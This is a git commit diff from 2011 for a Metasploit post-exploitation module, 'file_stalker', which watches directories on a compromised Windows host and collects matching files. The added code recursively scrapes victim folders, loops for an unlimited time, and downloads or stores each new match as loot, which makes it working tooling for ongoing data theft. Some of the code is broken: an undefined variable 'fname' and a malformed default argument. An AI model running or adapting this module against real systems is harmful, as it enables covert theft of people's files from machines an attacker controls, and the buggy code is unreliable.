18813bfeb98cc455c97f3c5b77d8e639dac80ec6
Joshua Smith <kernelsmith@kernelsmith.com>
2011-06-08 23:50:38 -0400

    ghetto, but mostly working

--- modules/post/windows/gather/file_stalker.rb
+++ modules/post/windows/gather/file_stalker.rb
@@ -24,7 +24,7 @@ class Metasploit3 < Msf::Post
 			'Author'         => 
 				[
 					'kernelsmith',
-					'hdm',	# Based on hdm's ios backup module which is
+					'hdm',	# Based loosely on hdm's ios backup module which is
 					'bannedit' # Based on bannedit's pidgin_cred module structure 
 				],
 			'Version'        => '$Revision: 1 $',
@@ -39,6 +39,9 @@ class Metasploit3 < Msf::Post
 				OptString.new('GLOBS', [false, 'Collect files that match these globs, comma separated (ORd with any REGEX)','']),
 				OptInt.new('DURATION', [true, 'How long, in seconds, to keep stalking (-1 is infinite, 0 is run once)', -1]),
 				OptBool.new('EXAMPLES', [false, 'Do not run the module, just show me some example usage',false]),
+				OptInt.new('DELAY',[false, 'Delay, in secs, between file system queries',0]),
+				OptBool.new('LOOT',[true, 'Loot the files instead of a simple download',false]),
+				OptBool.new('ALWAYS',[true, 'Always download file that matches, even if not new' ,false]),
 				OptBool.new('DEBUG', [false, 'Verbose output for debugging',true])
 			], self.class)
 	end
@@ -48,7 +51,6 @@ class Metasploit3 < Msf::Post
 	# 
 	#
 	def run
-	
 		if datastore['EXAMPLES'] == true
 			print_status("run -j -o DIRS='C:\\Documents and Settings,C:\\docs',REGEX='sec|fin',DEPTH=2,DURATION=-1")
 			print_status("- OR -")
@@ -71,8 +73,12 @@ class Metasploit3 < Msf::Post
 			raise(ArgumentError, "REGEX and GLOBS can't both be empty")
 		end
 		
-		paths_arr= datastore['DIRS'].split(',')
-		stalk(paths_arr) unless paths_arr.empty?
+		@paths_arr= datastore['DIRS'].split(',')
+		@delay = datastore['DELAY'] || 0
+		@depth = datastore['DEPTH'] || 0
+		@current_depth = 0
+		stalk(@paths_arr) unless @paths_arr.empty?
+		
 	end  #end of run
 	
 	def session_file_join(*a)
@@ -83,7 +89,17 @@ class Metasploit3 < Msf::Post
 		else
 			fsep = '/'
 		end
-		a.join(fsep)
+		dirty = a.join(fsep)
+		#normalize in case joining partial directories, with diff numbers of slashes
+		case session.platform
+		when /win/
+			# normalize any number of win slashes to one slash, then replace with two
+			clean = dirty.squeeze('\\').gsub(/\\/,'\\\\')
+		else
+			# TODO:  This might need work, for now just turn any number of '/'s to just one
+			clean = dirty.squeeze('/')
+		end
+		clean
 	end
 	
 	def bug(*a)
@@ -94,15 +110,57 @@ class Metasploit3 < Msf::Post
 		end
 		print_status("DEBUG:  #{string}")
 	end
+	
+	def downleezy(file)
+		if not file
+			print_error("Filename not provided")
+			return
+		elsif datastore['LOOT']
+			print_status("Looting #{file}...")
+
+			begin
+				fdata = ""
+				if session.type == "shell"
+					fdata = session.shell_command("cat #{file}")
+				else
+					mfd = session.fs.file.new("#{fname}", "rb")
+					until mfd.eof?
+						fdata << mfd.read
+					end
+					mfd.close
+				end
+				rname = file || "unknown.bin"
+				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/_+/, "_")			
+				ctype = "application/octet-stream"
+			
+				store_loot("ltypeOID", ctype, session, fdata, rname, "stalked file #{rname}")
+		
+			rescue ::Interrupt 
+				raise $!
+			rescue ::Exception => e
+				print_error("Failed to loot #{file}: #{e.class} #{e}")
+			end
+		else
+			print_status("Downloading #{file} to current working directory")
+			begin
+				session.fs.file.download('./', file)
+			rescue ::Interrupt 
+				raise $!
+			rescue ::Exception => e
+				print_error("Failed to download #{file}: #{e.class} #{e}")
+			end		
+		end
+	end
 		
 	def stalk(paths)
 		# TODO: confirm atleast one valid directory?  If not, error
 		@paths = paths
-		bug("Paths are: #{paths}")
-		# remove any path from @paths that's not valid, warn about it?
+		bug("Paths are: #{@paths}")
+		# TODO: remove any path from @paths that's not valid, warn about it?
 		
 		glob_arr = datastore['GLOBS'].split(',')
-		combo = datastore['REGEXP'] || ''
+		combo = "#{datastore['REGEXP']}" || ''
+		# this is ghetto
 		glob_arr.each do |glob|
 			if combo.empty?
 				combo = ".#{glob}$" 
@@ -110,45 +168,82 @@ class Metasploit3 < Msf::Post
 				combo = "#{combo}|.#{glob}$"
 			end
 		end
+		
 		bug("combo is #{combo}")
+		@pattern = Regexp.new(combo)
+		bug("pattern is #{@pattern}")
 		
-		pattern = Regexp.new(combo)
-		
-		#get initial file listing and match against pattern
-		initial = []
-		@paths.each do |dir|
-			files = session.fs.dir.entries(dir)
-			bug("Dir entries are:  #{files}")
-				files.each do |f|
-					next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
-					initial << session_file_join(dir,f) if pattern.match(f)
-				end
+		#
+		# get INITIAL file listing and match against pattern
+		#
+		@initial = []
+		@delta = []
+		begin
+			@initial = scrape(@paths,datastore['ALWAYS'])
+		rescue Rex::Post::Meterpreter::RequestError
+			# Handle directories that do not exist
+		ensure
+			# reset depths
+			@depth = datastore['DEPTH'] || 0
+			@current_depth = 0
 		end
 		
-		print_status("Initially found: #{initial}")
-		#results = @client.fs.file.search(location,s,recurse)
+		bug("Initially found: #{@initial}")
 		
-		delta = []
-		#periodically get file listing and match against pattern
+		#
+		# DELTA, periodically get file listing and match against pattern
+		#
 		if datastore['DURATION'] != 0
 			start = Time.new()
 			print_status("Stalking files, start time:  #{start}")
-			# while time elapsed is < duration OR duration is set to -1 (infinite)
-			while ( (Time.new - start) < datastore['DURATION'] || datastore['DURATION'] == -1 ) do
-				@paths.each do |dir|
-					files = session.fs.dir.entries(dir)
-						files.each do |f|
-							next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
-							delta << session_file_join(dir,f) if ( 
-								pattern.match(f) and initial.include?("#{f}") == false and delta.include?("#{f}") == false
-															)
-						end
+
+			# trap to gracefully handle user forcefully terminating me
+			trapped = false
+			Kernel.trap( "INT" ) { trapped = true }
+			while ( !trapped and ((Time.new - start) < datastore['DURATION'] or datastore['DURATION'] == -1) )
+				begin
+					@delta += scrape(@paths)
+					select(nil, nil, nil, @delay)
+				rescue Rex::Post::Meterpreter::RequestError
+					# Handle directories that do not exist
+				end
+				# reset depths
+				@depth = datastore['DEPTH'] || 0
+				@current_depth = 0
+			end
+			bug("Elapsed time = #{Time.new - start}")
+			print_status("During that time I also found: #{@delta}")
+		end
+	end
+	
+	def scrape(dirs=n[], download=true)
+		# dirs is an array and should ieally be a full paths
+		return if dirs.empty?
+		dirs_to_recurse = []
+		delta = []
+	
+		dirs.each do |adir|
+			bug("Processing #{adir}")
+			files = session.fs.dir.entries(adir)
+			# do a level
+			files.each do |f|
+				next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
+				fullname = session_file_join(adir,f)
+	
+				# stage recursion if recursion not exceeded and file is a dir
+				if (@current_depth < @depth and session.fs.filestat.new(fullname).directory?)
+					dirs_to_recurse << fullname
+				elsif (@pattern.match(f) and not @initial.include?(fullname) and not @delta.include?(fullname))
+					downleezy(fullname) if download # download that baby
+					delta << fullname # add to delta list
 				end
 			end
-			print_status("Elapsed time = #{Time.new - start}")
-			print_status("During that time I also found: #{delta}")
-			print_status("I would download those now")
 		end
-
+		@current_depth += 1 # increment depth to next level
+		if not dirs_to_recurse.empty?
+			delta += scrape(dirs_to_recurse,download)
+			# union,|, would get rid of duplicates, but I assume it's slower?
+		end
+		delta.flatten
 	end
 end
